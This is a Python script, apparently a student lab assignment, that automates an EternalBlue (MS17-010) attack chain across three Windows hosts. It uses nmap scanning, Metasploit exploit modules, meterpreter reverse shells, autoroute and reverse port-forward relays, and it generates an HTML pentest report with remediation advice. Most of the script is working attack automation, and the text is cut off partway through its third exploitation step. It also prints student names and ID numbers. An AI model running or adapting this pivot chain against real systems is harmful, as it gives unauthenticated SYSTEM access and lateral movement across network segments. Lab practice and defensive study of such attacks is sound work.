#!/usr/bin/env python3
"""
Automated EternalBlue Pivot Chain - Group 17 | RIS602-NBB
Topology: Kali -> M1 -> M2 -> M3

Usage:
    sudo ./pivot_chain.py <KALI_IP> <KALI_SUBNET>

Example:
    sudo ./pivot_chain.py 172.16.2.1 172.16.2.0/29
"""

import subprocess
import os
import re
import time
import sys
import threading
from datetime import datetime

# ─── COMMAND LINE ARGS ────────────────────────────────────────────────────────
if len(sys.argv) != 3:
    print(f"Usage: sudo {sys.argv[0]} <KALI_IP> <KALI_SUBNET>")
    print(f"Example: sudo {sys.argv[0]} 172.16.2.1 172.16.2.0/29")
    sys.exit(1)

LHOST       = sys.argv[1]
KALI_SUBNET = sys.argv[2]

LPORT       = 4444
PIVOT_PORT  = 5555
PIVOT_PORT2 = 6666
OUTPUT_DIR  = os.path.expanduser("~/auto_pentest_results")
TIMESTAMP   = time.strftime("%Y%m%d_%H%M%S")
LOGFILE     = os.path.join(OUTPUT_DIR, f"report_{TIMESTAMP}.log")
STATE_FILE  = os.path.join(OUTPUT_DIR, "state.env")

GROOM_ALLOC = 24
GROOM_DELTA = 3
MAX_RETRIES = 3
RETRY_SLEEP = 90
MSF_TIMEOUT = 600

os.makedirs(OUTPUT_DIR, exist_ok=True)
state = {"TIMESTAMP": TIMESTAMP, "LHOST": LHOST, "LPORT": str(LPORT)}

# ─── HELPERS ──────────────────────────────────────────────────────────────────
def log(msg):
    ts = time.strftime("%H:%M:%S")
    stamped = f"[{ts}] {msg}"
    print(stamped, flush=True)
    with open(LOGFILE, "a") as f:
        f.write(stamped + "\n")

def save_state():
    with open(STATE_FILE, "w") as f:
        for k, v in state.items():
            f.write(f"{k}={v}\n")

def run_rc(rc_path, log_path):
    log(f"[*] Launching: {rc_path}")
    proc = subprocess.Popen(
        ["msfconsole", "-q", "-r", rc_path],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1
    )
    lines = []

    def _reader():
        with open(log_path, "w") as f:
            for line in proc.stdout:
                print(line, end="", flush=True)
                f.write(line)
                f.flush()
                lines.append(line)

    t = threading.Thread(target=_reader, daemon=True)
    t.start()
    t.join(timeout=MSF_TIMEOUT)

    if t.is_alive():
        log(f"[!] msfconsole hung — force killing (pid {proc.pid})")
        proc.kill()
        t.join(timeout=10)

    proc.wait()
    return "".join(lines)

def write_rc(path, lines):
    with open(path, "w") as f:
        f.write("\n".join(lines) + "\n")

def eb_direct(rhosts, lhost, lport):
    return [
        "use exploit/windows/smb/ms17_010_eternalblue",
        f"set RHOSTS {rhosts}",
        "set RPORT 445",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
        "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
        f"set GroomAllocations {GROOM_ALLOC}",
        f"set GroomDelta {GROOM_DELTA}",
        "run -z -j",
    ]

def eb_pivot(rhosts, lhost, lport):
    return [
        "use exploit/windows/smb/ms17_010_eternalblue_win8",
        f"set RHOSTS {rhosts}",
        "set RPORT 445",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
        "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
        "set ForceExploit true",
        "run -z -j",
    ]

def pivot_setup_block(via_session, pivot_port):
    return [
        f'sessions -i {via_session} -C "portfwd add -R -l {pivot_port} -L 0.0.0.0 -p {pivot_port} -r {LHOST}"',
        "sleep 3",
        "use multi/handler",
        "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
        f"set LHOST {LHOST}",
        f"set LPORT {pivot_port}",
        "run -j",
        "sleep 2",
    ]

def autoroute_block(session_id):
    return [
        "use post/multi/manage/autoroute",
        f"set SESSION {session_id}",
        "set CMD autoadd",
        "run",
        "sleep 5",
        "route print",
    ]

def poll_block(iterations=15, interval=20):
    lines = []
    for _ in range(iterations):
        lines += [f"sleep {interval}", "sessions -l"]
    return lines

def parse_nic2_ip(output, *excluded_prefixes):
    for ip in re.findall(r'IPv4 Address[\s.]+:\s*(\d+\.\d+\.\d+\.\d+)', output):
        if ip.startswith("127."):
            continue
        prefix = ".".join(ip.split(".")[:3])
        if prefix not in excluded_prefixes:
            return ip
    return None

def parse_vulnerable_in_subnet(output, subnet_prefix):
    pattern = re.compile(r'(\d+\.\d+\.\d+\.\d+):445\s+-\s+Host is likely VULNERABLE')
    seen, found = set(), []
    for ip in pattern.findall(output):
        if ip.startswith(subnet_prefix + ".") and ip not in seen:
            found.append(ip)
            seen.add(ip)
    return found

def parse_os_from_scan(output, ip):
    pattern = rf"{re.escape(ip)}:445\s+-\s+Host is likely VULNERABLE to MS17-010!\s+-\s+(.+?)$"
    m = re.search(pattern, output, re.MULTILINE)
    return m.group(1).strip() if m else "Windows (version unknown)"

def parse_session_time(output, session_num):
    m = re.search(rf"Meterpreter session {session_num} opened.*?at (.+?)$",
                  output, re.MULTILINE)
    return m.group(1).strip() if m else "N/A"

def find_session_for_ip(output, target_ip):
    """
    Find the session number for a specific target IP from msfconsole output.
    Handles duplicate sessions by finding the right one for the IP.
    Returns the session number as a string, or None.
    """
    # Look for session opened lines with the target IP
    pattern = rf"Meterpreter session (\d+) opened.*?\({re.escape(target_ip)}\)"
    matches = re.findall(pattern, output)
    if matches:
        return matches[-1]  # return the last one if duplicates
    # fallback: look in sessions -l table
    for line in output.splitlines():
        if target_ip in line and "meterpreter" in line.lower():
            m = re.match(r'\s*(\d+)\s+', line)
            if m:
                return m.group(1)
    return None

# ══════════════════════════════════════════════════════════════════════════════
# HTML REPORT GENERATOR
# ══════════════════════════════════════════════════════════════════════════════
def generate_html_report(targets, m3_nic2=None, m4_subnet=None):
    report_path = os.path.join(OUTPUT_DIR, f"pentest_report_{TIMESTAMP}.html")
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Build target rows for summary table
    target_rows = ""
    for t in targets:
        target_rows += f"""
        <tr>
          <td>M{t['session_num']}</td>
          <td><code>{t['ip']}</code></td>
          <td><code>{t['subnet']}</code></td>
          <td>{t['os_str']}</td>
          <td>{t['session_time']}</td>
          <td><span class="badge critical">CRITICAL</span></td>
        </tr>"""

    # Build findings cards
    findings_html = ""
    for t in targets:
        via_str = (f"Pivoted via Session {t['via']} — portfwd relay port {t['pivot_port']}"
                   if t['via'] else "Direct TCP connection (EternalBlue)")
        findings_html += f"""
      <div class="finding-card">
        <div class="finding-header">
          <span class="badge critical">CRITICAL</span>
          <h3>M{t['session_num']} — {t['ip']}</h3>
        </div>
        <table class="detail-table">
          <tr><td>IP Address</td><td><code>{t['ip']}</code></td></tr>
          <tr><td>Subnet</td><td><code>{t['subnet']}</code></td></tr>
          <tr><td>Operating System</td><td>{t['os_str']}</td></tr>
          <tr><td>Session Opened</td><td>{t['session_time']}</td></tr>
          <tr><td>Access Obtained</td><td><strong>NT AUTHORITY\\SYSTEM</strong> (unauthenticated)</td></tr>
          <tr><td>Exploit Module</td><td><code>{t['exploit_module']}</code></td></tr>
          <tr><td>Delivery</td><td>{via_str}</td></tr>
          <tr><td>CVE</td><td>CVE-2017-0144</td></tr>
          <tr><td>Evidence</td><td><code>ETERNALBLUE overwrite completed successfully (0xC000000D)</code></td></tr>
        </table>
      </div>"""

    # Build pivot chain diagram
    chain_steps = ""
    t1 = targets[0]
    chain_steps += f"""
      <div class="chain-node attacker">
        <div class="node-icon">🖥️</div>
        <div class="node-info">
          <strong>Kali Linux</strong><br>
          <code>{LHOST}</code><br>
          <em>Rogue internal user</em>
        </div>
      </div>
      <div class="chain-arrow">
        <span>EternalBlue direct</span><br>
        <small>LPORT {LPORT}</small>
      </div>"""

    for i, t in enumerate(targets):
        chain_steps += f"""
      <div class="chain-node compromised">
        <div class="node-icon">💀</div>
        <div class="node-info">
          <strong>M{t['session_num']} — Session {t['session_num']}</strong><br>
          <code>{t['ip']}</code><br>
          <em>NT AUTHORITY\\SYSTEM</em>
        </div>
      </div>"""
        if i < len(targets) - 1:
            nt = targets[i + 1]
            chain_steps += f"""
      <div class="chain-arrow">
        <span>portfwd :{t['pivot_port_out']}</span><br>
        <small>autoroute → {nt['subnet']}</small>
      </div>"""

    # Add M4 discovery note if available
    m4_note = ""
    if m3_nic2 and m4_subnet:
        m4_note = f"""
      <div class="chain-arrow">
        <span>NIC2 discovered</span><br>
        <small>autoroute → {m4_subnet}</small>
      </div>
      <div class="chain-node discovered">
        <div class="node-icon">🔍</div>
        <div class="node-info">
          <strong>M4 Subnet Discovered</strong><br>
          <code>{m4_subnet}</code><br>
          <em>Further pivot possible</em>
        </div>
      </div>"""
    chain_steps += m4_note

    m4_section = ""
    if m3_nic2 and m4_subnet:
        m4_section = f"""
    <div class="section">
      <h2>5. Further Pivot Discovery</h2>
      <p>Following successful compromise of M3 (<code>{targets[2]['ip']}</code>),
      enumeration of the host's network interfaces via <code>ipconfig</code> revealed
      a second NIC with IP address <code>{m3_nic2}</code>, indicating connectivity
      to an additional network segment: <code>{m4_subnet}</code>.</p>
      <p>This subnet was confirmed reachable via Metasploit autoroute through Session 3,
      and contains additional hosts — including a router boundary — that could be
      targeted in a further pivot. This demonstrates that the attack chain does not
      end at M3 and could continue deeper into the enterprise network.</p>
      <div class="info-box">
        <strong>M3 NIC2:</strong> <code>{m3_nic2}</code><br>
        <strong>Reachable subnet:</strong> <code>{m4_subnet}</code><br>
        <strong>Status:</strong> Discovered — further exploitation possible
      </div>
    </div>"""

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Penetration Test Report — Group 17 | RIS602-NBB</title>
  <style>
    * {{ box-sizing: border-box; margin: 0; padding: 0; }}
    body {{
      font-family: 'Segoe UI', Arial, sans-serif;
      background: #0f1117;
      color: #e2e8f0;
      line-height: 1.6;
    }}
    .header {{
      background: linear-gradient(135deg, #1a1f2e 0%, #0d1117 100%);
      border-bottom: 2px solid #e53e3e;
      padding: 40px;
      text-align: center;
    }}
    .header h1 {{
      font-size: 2rem;
      color: #fff;
      margin-bottom: 8px;
      letter-spacing: 2px;
      text-transform: uppercase;
    }}
    .header .subtitle {{
      color: #a0aec0;
      font-size: 0.95rem;
    }}
    .header .meta {{
      margin-top: 20px;
      display: flex;
      justify-content: center;
      gap: 40px;
      flex-wrap: wrap;
    }}
    .header .meta-item {{
      text-align: center;
    }}
    .header .meta-item .label {{
      color: #718096;
      font-size: 0.75rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }}
    .header .meta-item .value {{
      color: #e2e8f0;
      font-size: 0.9rem;
      margin-top: 4px;
    }}
    .container {{
      max-width: 1100px;
      margin: 0 auto;
      padding: 40px 20px;
    }}
    .section {{
      background: #1a1f2e;
      border: 1px solid #2d3748;
      border-radius: 8px;
      padding: 30px;
      margin-bottom: 24px;
    }}
    .section h2 {{
      color: #e53e3e;
      font-size: 1.1rem;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin-bottom: 20px;
      padding-bottom: 10px;
      border-bottom: 1px solid #2d3748;
    }}
    .section p {{
      color: #a0aec0;
      margin-bottom: 12px;
    }}
    .badge {{
      display: inline-block;
      padding: 3px 10px;
      border-radius: 4px;
      font-size: 0.75rem;
      font-weight: bold;
      text-transform: uppercase;
      letter-spacing: 1px;
    }}
    .badge.critical {{ background: #e53e3e; color: #fff; }}
    .badge.info {{ background: #3182ce; color: #fff; }}
    table.summary-table {{
      width: 100%;
      border-collapse: collapse;
      margin-top: 10px;
    }}
    table.summary-table th {{
      background: #2d3748;
      color: #a0aec0;
      font-size: 0.75rem;
      text-transform: uppercase;
      letter-spacing: 1px;
      padding: 10px 14px;
      text-align: left;
    }}
    table.summary-table td {{
      padding: 12px 14px;
      border-bottom: 1px solid #2d3748;
      color: #e2e8f0;
      font-size: 0.9rem;
    }}
    table.summary-table tr:last-child td {{ border-bottom: none; }}
    table.summary-table tr:hover td {{ background: #2d3748; }}
    .finding-card {{
      border: 1px solid #e53e3e33;
      border-left: 4px solid #e53e3e;
      border-radius: 6px;
      padding: 20px;
      margin-bottom: 20px;
      background: #0d1117;
    }}
    .finding-header {{
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 16px;
    }}
    .finding-header h3 {{
      color: #fff;
      font-size: 1rem;
    }}
    table.detail-table {{
      width: 100%;
      border-collapse: collapse;
    }}
    table.detail-table td {{
      padding: 8px 12px;
      border-bottom: 1px solid #2d3748;
      font-size: 0.875rem;
    }}
    table.detail-table td:first-child {{
      color: #718096;
      width: 180px;
      font-weight: 500;
    }}
    table.detail-table td:last-child {{ color: #e2e8f0; }}
    code {{
      background: #2d3748;
      color: #68d391;
      padding: 2px 6px;
      border-radius: 3px;
      font-family: 'Courier New', monospace;
      font-size: 0.85em;
    }}
    .chain-container {{
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      gap: 0;
      padding: 10px 0;
    }}
    .chain-node {{
      display: flex;
      align-items: center;
      gap: 16px;
      padding: 16px 20px;
      border-radius: 8px;
      border: 1px solid #2d3748;
      min-width: 340px;
    }}
    .chain-node.attacker {{ border-color: #3182ce; background: #1a1f3e; }}
    .chain-node.compromised {{ border-color: #e53e3e; background: #1a1117; }}
    .chain-node.discovered {{ border-color: #d69e2e; background: #1a1a0e; }}
    .chain-node .node-icon {{ font-size: 1.8rem; }}
    .chain-node .node-info {{ font-size: 0.875rem; line-height: 1.6; }}
    .chain-node .node-info strong {{ color: #fff; }}
    .chain-node .node-info em {{ color: #718096; font-size: 0.8rem; }}
    .chain-arrow {{
      margin-left: 30px;
      padding: 8px 0;
      color: #718096;
      font-size: 0.8rem;
      position: relative;
    }}
    .chain-arrow::before {{
      content: "│";
      display: block;
      color: #4a5568;
      font-size: 1rem;
    }}
    .chain-arrow::after {{
      content: "└─►";
      color: #e53e3e;
      margin-right: 8px;
    }}
    .rec-item {{
      display: flex;
      gap: 16px;
      padding: 14px 0;
      border-bottom: 1px solid #2d3748;
    }}
    .rec-item:last-child {{ border-bottom: none; }}
    .rec-num {{
      background: #e53e3e;
      color: #fff;
      width: 28px;
      height: 28px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 0.8rem;
      font-weight: bold;
      flex-shrink: 0;
      margin-top: 2px;
    }}
    .rec-content h4 {{ color: #fff; font-size: 0.95rem; margin-bottom: 4px; }}
    .rec-content p {{ color: #a0aec0; font-size: 0.875rem; margin: 0; }}
    .step-list {{
      list-style: none;
      counter-reset: step-counter;
    }}
    .step-list li {{
      counter-increment: step-counter;
      display: flex;
      gap: 14px;
      padding: 10px 0;
      border-bottom: 1px solid #2d3748;
      font-size: 0.875rem;
      color: #a0aec0;
    }}
    .step-list li:last-child {{ border-bottom: none; }}
    .step-list li::before {{
      content: counter(step-counter);
      background: #2d3748;
      color: #68d391;
      width: 24px;
      height: 24px;
      border-radius: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 0.75rem;
      font-weight: bold;
      flex-shrink: 0;
      margin-top: 1px;
    }}
    .info-box {{
      background: #0d1117;
      border: 1px solid #d69e2e44;
      border-left: 4px solid #d69e2e;
      border-radius: 6px;
      padding: 16px;
      margin-top: 16px;
      font-size: 0.875rem;
      line-height: 1.8;
    }}
    .stat-grid {{
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 16px;
      margin-top: 10px;
    }}
    .stat-card {{
      background: #0d1117;
      border: 1px solid #2d3748;
      border-radius: 6px;
      padding: 16px;
      text-align: center;
    }}
    .stat-card .stat-value {{
      font-size: 1.8rem;
      font-weight: bold;
      color: #e53e3e;
    }}
    .stat-card .stat-label {{
      color: #718096;
      font-size: 0.75rem;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-top: 4px;
    }}
    .footer {{
      text-align: center;
      padding: 30px;
      color: #4a5568;
      font-size: 0.8rem;
      border-top: 1px solid #2d3748;
      margin-top: 20px;
    }}
  </style>
</head>
<body>

<div class="header">
  <h1>Penetration Test Report</h1>
  <div class="subtitle">Automated EternalBlue Pivot Chain — SPR500 Enterprise Lab</div>
  <div class="meta">
    <div class="meta-item">
      <div class="label">Course</div>
      <div class="value">RIS602-NBB</div>
    </div>
    <div class="meta-item">
      <div class="label">Group</div>
      <div class="value">17</div>
    </div>
    <div class="meta-item">
      <div class="label">Date</div>
      <div class="value">{now}</div>
    </div>
    <div class="meta-item">
      <div class="label">Classification</div>
      <div class="value">CONFIDENTIAL</div>
    </div>
  </div>
</div>

<div class="container">

  <!-- Members -->
  <div class="section">
    <h2>Team Members</h2>
    <table class="summary-table">
      <tr><th>Name</th><th>Student ID</th></tr>
      <tr><td>Ayaan Hirsi</td><td>17317721</td></tr>
      <tr><td>Shiza Arshad</td><td>105578231</td></tr>
      <tr><td>Chinazo Amalachukwu Mbonu</td><td>142166222</td></tr>
    </table>
  </div>

  <!-- Stats -->
  <div class="section">
    <h2>Assessment Summary</h2>
    <div class="stat-grid">
      <div class="stat-card">
        <div class="stat-value">{len(targets)}</div>
        <div class="stat-label">Hosts Compromised</div>
      </div>
      <div class="stat-card">
        <div class="stat-value">{len(targets)}</div>
        <div class="stat-label">VLANs Breached</div>
      </div>
      <div class="stat-card">
        <div class="stat-value">0</div>
        <div class="stat-label">Credentials Used</div>
      </div>
      <div class="stat-card">
        <div class="stat-value">0</div>
        <div class="stat-label">Manual Steps</div>
      </div>
    </div>
  </div>

  <!-- Executive Summary -->
  <div class="section">
    <h2>1. Executive Summary</h2>
    <p>This report documents the results of an automated penetration test conducted
    against the SPR500 enterprise lab environment by Group 17 as part of RIS602-NBB.</p>
    <p>The scenario simulates a rogue internal user (Kali Linux, <code>{LHOST}</code>)
    with basic internal network access exploiting unpatched systems and absent internal
    segmentation controls to achieve SYSTEM-level access across {len(targets)} isolated
    network segments. This demonstrates the critical importance of internal least-privilege
    controls, inter-VLAN firewalling, and patch management — not just perimeter defences.</p>
    <p>A complete {len(targets)}-hop EternalBlue (MS17-010) pivot chain was demonstrated
    using a fully automated Python script with zero manual steps. All target machines were
    compromised as <strong>NT AUTHORITY\\SYSTEM</strong> — the highest privilege level on
    Windows — with no credentials required at any stage.</p>
  </div>

  <!-- Scope -->
  <div class="section">
    <h2>2. Scope</h2>
    <table class="detail-table">
      <tr><td>Attacker Machine</td><td>Kali Linux — <code>{LHOST}</code> (rogue internal user)</td></tr>
      <tr><td>Initial Subnet</td><td><code>{KALI_SUBNET}</code></td></tr>
      <tr><td>Attack Scenario</td><td>Internal threat actor with basic network access</td></tr>
      <tr><td>Vulnerability</td><td>MS17-010 / CVE-2017-0144 (EternalBlue)</td></tr>
      <tr><td>Testing Method</td><td>Fully automated black-box penetration test</td></tr>
      <tr><td>Testing Period</td><td>{now}</td></tr>
    </table>
    <br>
    <h3 style="color:#a0aec0; font-size:0.85rem; text-transform:uppercase; letter-spacing:1px; margin-bottom:10px;">In-Scope Targets</h3>
    <table class="summary-table">
      <tr>
        <th>Host</th><th>IP Address</th><th>Subnet</th>
        <th>Operating System</th><th>Session Time</th><th>Severity</th>
      </tr>
      {target_rows}
    </table>
  </div>

  <!-- Findings -->
  <div class="section">
    <h2>3. Target Findings</h2>
    {findings_html}
  </div>

  <!-- Pivot Chain -->
  <div class="section">
    <h2>4. Pivot Chain</h2>
    <div class="chain-container">
      {chain_steps}
    </div>
    <br>
    <table class="detail-table">
      <tr><td>S1 callback</td><td><code>{targets[0]['ip']} → Kali {LHOST}:{LPORT}</code></td></tr>
      <tr><td>S2 callback</td><td><code>{targets[1]['ip']} → M1 portfwd:{PIVOT_PORT} → Kali 0.0.0.0:{PIVOT_PORT}</code></td></tr>
      <tr><td>S3 callback</td><td><code>{targets[2]['ip']} → M2 portfwd:{PIVOT_PORT2} → M1:{PIVOT_PORT2} → Kali</code></td></tr>
    </table>
  </div>

  {m4_section}

  <!-- Vulnerability Details -->
  <div class="section">
    <h2>{'6' if m3_nic2 else '5'}. Vulnerability Details</h2>
    <table class="detail-table">
      <tr><td>Name</td><td>MS17-010 EternalBlue</td></tr>
      <tr><td>CVE</td><td>CVE-2017-0144</td></tr>
      <tr><td>CVSS Score</td><td>9.3 (Critical)</td></tr>
      <tr><td>Affected OS</td><td>Windows 7, Windows Server 2008 R2 (unpatched)</td></tr>
      <tr><td>Patch</td><td>Microsoft KB4012212 (March 2017)</td></tr>
    </table>
    <br>
    <p>EternalBlue exploits a buffer overflow in the Windows SMBv1 server
    (<code>srv.sys</code>). Specially crafted packets corrupt kernel pool memory,
    achieving unauthenticated remote code execution at SYSTEM level. No credentials
    are required.</p>
    <p>The <code>ms17_010_eternalblue_win8</code> variant was used for pivoted hops
    because the standard module opens a second SMB connection
    (<code>smb1_anonymous_connect_ipc</code>) that fails over a meterpreter tunnel.
    The win8 variant uses a single-connection code path that tolerates tunnel latency.
    A reverse <code>portfwd</code> relay on each compromised hop catches the callback
    and pipes it transparently back to Kali.</p>
  </div>

  <!-- Impact -->
  <div class="section">
    <h2>{'7' if m3_nic2 else '6'}. Impact Assessment</h2>
    <table class="detail-table">
      <tr><td>Access Achieved</td><td>NT AUTHORITY\\SYSTEM on all {len(targets)} targets</td></tr>
      <tr><td>Segmentation</td><td>Fully bypassed — all {len(targets)} isolated VLANs compromised</td></tr>
      <tr><td>Router Boundary</td><td>Traversed transparently via meterpreter autoroute</td></tr>
      <tr><td>Credentials</td><td>None — entirely unauthenticated</td></tr>
      <tr><td>Manual Steps</td><td>Zero — fully automated</td></tr>
    </table>
    <br>
    <p>An attacker with this level of access could exfiltrate data from all segments,
    deploy ransomware enterprise-wide, establish persistent backdoors, pivot to AD and
    file sharing services, and dump credential hashes for further lateral movement.</p>
  </div>

  <!-- Recommendations -->
  <div class="section">
    <h2>{'8' if m3_nic2 else '7'}. Recommendations</h2>
    <div class="rec-item">
      <div class="rec-num">1</div>
      <div class="rec-content">
        <h4>Patch Immediately</h4>
        <p>Apply KB4012212 to all affected systems. Migrate from end-of-life
        Windows 7 / Server 2008 R2 to a supported, actively patched OS.</p>
      </div>
    </div>
    <div class="rec-item">
      <div class="rec-num">2</div>
      <div class="rec-content">
        <h4>Disable SMBv1</h4>
        <p>SMBv1 is legacy and insecure. Disable on all hosts:<br>
        <code>Set-SmbServerConfiguration -EnableSMB1Protocol $false</code></p>
      </div>
    </div>
    <div class="rec-item">
      <div class="rec-num">3</div>
      <div class="rec-content">
        <h4>Enforce Internal Firewall Rules (Critical)</h4>
        <p>This attack succeeded because of absent internal controls. Block TCP/445
        between all VLANs — apply deny-by-default ACLs at every router interface
        and between all network segments.</p>
      </div>
    </div>
    <div class="rec-item">
      <div class="rec-num">4</div>
      <div class="rec-content">
        <h4>Implement Least Privilege for Internal Users</h4>
        <p>A rogue or compromised internal user should not be able to reach SMB
        outside their own subnet. Apply network-level access controls per user role.</p>
      </div>
    </div>
    <div class="rec-item">
      <div class="rec-num">5</div>
      <div class="rec-content">
        <h4>Deploy EDR</h4>
        <p>Endpoint Detection and Response solutions can detect EternalBlue
        pool-grooming behaviour, anomalous SYSTEM process creation via SMB,
        and meterpreter staging.</p>
      </div>
    </div>
    <div class="rec-item">
      <div class="rec-num">6</div>
      <div class="rec-content">
        <h4>Patch Compliance Monitoring</h4>
        <p>Enforce critical patch deployment within 30 days of release across all
        network segments, verified by automated compliance scanning.</p>
      </div>
    </div>
  </div>

  <!-- Automation Summary -->
  <div class="section">
    <h2>{'9' if m3_nic2 else '8'}. Automation Summary</h2>
    <ul class="step-list">
      <li>nmap port scan of initial subnet — identified live SMB hosts</li>
      <li>nmap smb-vuln-ms17-010 — confirmed EternalBlue on M1</li>
      <li>Exploited M1 directly, ran autoroute + ipconfig — discovered M2 subnet</li>
      <li>Re-exploited M1, scanned M2 subnet — identified M2 IP and OS</li>
      <li>Exploited M1 → portfwd relay → exploited M2 — ipconfig → discovered M3 subnet</li>
      <li>Full chain rebuilt, scanned M3 subnet — identified M3 IP and OS</li>
      <li>Full chain → exploited M3 — all 3 sessions confirmed SYSTEM access</li>
      <li>ipconfig on M3 — discovered additional subnet {m4_subnet if m4_subnet else '(N/A)'} for further pivoting</li>
    </ul>
    <br>
    <table class="detail-table">
      <tr><td>Total manual steps</td><td>0</td></tr>
      <tr><td>Script language</td><td>Python 3</td></tr>
      <tr><td>Exploit framework</td><td>Metasploit Framework (msfconsole)</td></tr>
      <tr><td>Approx. runtime</td><td>45-60 minutes including recovery waits</td></tr>
      <tr><td>Output directory</td><td><code>{OUTPUT_DIR}/</code></td></tr>
      <tr><td>Master log</td><td><code>{LOGFILE}</code></td></tr>
    </table>
  </div>

</div>

<div class="footer">
  Group 17 | RIS602-NBB | SPR500 Enterprise Lab | Generated {now}
</div>

</body>
</html>"""

    with open(report_path, "w") as f:
        f.write(html)

    log(f"[+] HTML report saved: {report_path}")
    return report_path


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 1 — Scan KALI_SUBNET, confirm EternalBlue on M1
# ══════════════════════════════════════════════════════════════════════════════
log("")
log(f"[*] Starting pivot chain at {TIMESTAMP}")
log(f"[*] LHOST = {LHOST}  |  Subnet = {KALI_SUBNET}")
log("")
log(f">>> PHASE 1: Scanning {KALI_SUBNET} for port 445...")

scan_out = subprocess.run(
    ["nmap", "-Pn", "-p445", "--open", "-T4", KALI_SUBNET],
    capture_output=True, text=True
).stdout
log(scan_out)

hosts = [h for h in re.findall(r'Nmap scan report for [^\n]*?(\d+\.\d+\.\d+\.\d+)', scan_out)
         if h != LHOST]
if not hosts:
    log("[-] No SMB hosts found. Exiting."); sys.exit(1)
log(f"[*] Hosts with 445 open: {', '.join(hosts)}")

log("")
log(">>> PHASE 2: Confirming EternalBlue vulnerability...")
vuln_hosts = []
vuln_nmap_outputs = {}
for ip in hosts:
    out = subprocess.run(
        ["nmap", "-Pn", "--script", "smb-vuln-ms17-010", "-p445", ip],
        capture_output=True, text=True
    ).stdout
    if "VULNERABLE" in out:
        log(f"[+] VULNERABLE: {ip}")
        vuln_hosts.append(ip)
        vuln_nmap_outputs[ip] = out

if not vuln_hosts:
    log("[-] No vulnerable hosts found. Exiting."); sys.exit(1)

M1_IP     = vuln_hosts[0]
M1_PREFIX = ".".join(M1_IP.split(".")[:3])
state["M1_IP"] = M1_IP
log(f"[+] M1 = {M1_IP}")
save_state()

# ══════════════════════════════════════════════════════════════════════════════
# STEP 1 — Exploit M1, autoroute, ipconfig → find M2 subnet
# ══════════════════════════════════════════════════════════════════════════════
log("")
log(">>> STEP 1: Exploit M1 (direct), learn M2 subnet...")

step1_rc  = os.path.join(OUTPUT_DIR, "step1.rc")
step1_log = os.path.join(OUTPUT_DIR, f"step1_{TIMESTAMP}.log")

write_rc(step1_rc, [
    "setg ExitOnSession false",
] + eb_direct(M1_IP, LHOST, LPORT) + [
    "sleep 40", "sessions -l",
] + autoroute_block(1) + [
    'sessions -i 1 -C "ipconfig"',
    "sleep 3", "sessions -l", "exit -y",
])
step1_out = run_rc(step1_rc, step1_log)

if "Meterpreter session 1 opened" not in step1_out:
    log("[-] Session 1 failed. Exiting."); sys.exit(1)

M1_NIC2 = parse_nic2_ip(step1_out, M1_PREFIX)
if not M1_NIC2:
    log("[-] Could not parse M1 NIC2. Exiting."); sys.exit(1)

M2_PREFIX = ".".join(M1_NIC2.split(".")[:3])
M2_SUBNET = f"{M2_PREFIX}.0/29"
state.update({"M1_NIC2": M1_NIC2, "M2_PREFIX": M2_PREFIX, "M2_SUBNET": M2_SUBNET})
log(f"[+] M2 subnet: {M2_SUBNET}  |  M1 NIC2: {M1_NIC2}")
save_state()
S1_TIME = parse_session_time(step1_out, 1)

log("[*] Waiting 60s for M1 to recover...")
time.sleep(60)

# ══════════════════════════════════════════════════════════════════════════════
# STEP 2 — Re-exploit M1 → autoroute → scan M2 subnet
# ══════════════════════════════════════════════════════════════════════════════
log("")
log(f">>> STEP 2: Exploit M1 → route → scan {M2_SUBNET}...")

step2_rc  = os.path.join(OUTPUT_DIR, "step2.rc")
step2_log = os.path.join(OUTPUT_DIR, f"step2_{TIMESTAMP}.log")

write_rc(step2_rc, [
    "setg ExitOnSession false",
] + eb_direct(M1_IP, LHOST, LPORT) + [
    "sleep 40", "sessions -l",
] + autoroute_block(1) + [
    "use auxiliary/scanner/smb/smb_ms17_010",
    f"set RHOSTS {M2_SUBNET}",
    "set THREADS 2", "run", "sleep 20", "sessions -l", "exit -y",
])
step2_out = run_rc(step2_rc, step2_log)

if "Meterpreter session 1 opened" not in step2_out:
    log("[-] Session 1 (step2) failed. Exiting."); sys.exit(1)

vuln_in_m2    = parse_vulnerable_in_subnet(step2_out, M2_PREFIX)
M2_candidates = [ip for ip in vuln_in_m2 if ip != M1_NIC2]
if not M2_candidates:
    log("[-] No vulnerable M2 host found. Exiting."); sys.exit(1)

M2_IP = M2_candidates[0]
M2_OS = parse_os_from_scan(step2_out, M2_IP)
M2_PREFIX_R = ".".join(M2_IP.split(".")[:3])
state["M2_IP"] = M2_IP
log(f"[+] M2 = {M2_IP}")
save_state()

log("[*] Waiting 60s for machines to recover...")
time.sleep(60)

# ══════════════════════════════════════════════════════════════════════════════
# STEP 3 — Exploit M1 → pivot → exploit M2, learn M3 subnet
# ══════════════════════════════════════════════════════════════════════════════
log("")
log(f">>> STEP 3: Exploit M1 → route → exploit M2 ({M2_IP}) via pivot...")

step3_out       = ""
session2_opened = False

for attempt in range(1, MAX_RETRIES + 1):
    log(f"[*] Attempt {attempt}/{MAX_RETRIES} for Session 2...")
    step3_rc  = os.path.join(OUTPUT_DIR, f"step3_attempt{attempt}.rc")
    step3_log = os.path.join(OUTPUT_DIR, f"step3_attempt{attempt}_{TIMESTAMP}.log")

    write_rc(step3_rc, [
        "setg ExitOnSession false",
    ] + eb_direct(M1_IP, LHOST, LPORT) + [
        "sleep 40", "sessions -l",
    ] + autoroute_block(1) + pivot_setup_block(1, PIVOT_PORT) + \
